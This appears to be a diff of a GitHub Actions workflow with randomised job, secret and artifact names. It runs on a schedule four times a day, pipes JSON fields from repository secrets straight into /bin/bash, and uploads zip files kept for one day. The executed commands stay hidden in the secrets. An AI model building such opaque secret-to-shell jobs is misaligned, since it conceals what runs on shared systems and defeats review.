@@ -1,19 +1,24 @@
 name: ruiqiuchunlu
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '55 4/6 * * *'
-jobs:  # 14103
+    - cron: '7 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: ruiqiuchunlu
         env:
-          vtxqx39500: ${{ secrets.vtxqx39500 }}
+          lww4: ${{ secrets.lww4 }}
         run: |
-          echo $vtxqx39500 | jq -r .udne87903 | /bin/bash
-          echo $fku3 | jq -r .keyc042 | /bin/bash
-          echo $vgpd3 | jq -r .xmiw33447 | /bin/bash
-          echo $hd6993 | jq -r .sodr4062 | /bin/bash
+          printf '%s' "$lww4" | jq -r .za5 | /bin/bash
+          echo $kmv546 | jq -r .iyc3520 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ttjfYl6F
+          path: "*.zip"
+          retention-days: 1
